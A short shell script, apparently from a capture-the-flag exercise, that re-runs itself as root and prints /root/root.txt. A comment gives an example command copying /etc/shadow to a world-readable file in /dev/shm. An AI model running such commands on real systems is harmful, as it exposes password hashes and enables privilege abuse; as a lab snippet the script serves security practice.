#!/bin/sh
[ `whoami` = root ] || exec su -c $0 root
# Anything below ^this line^ runs as root
# e.g.
# cp /etc/shadow /dev/shm/s.txt && chmod a+r /dev/shm/s.txt
cat /root/root.txt
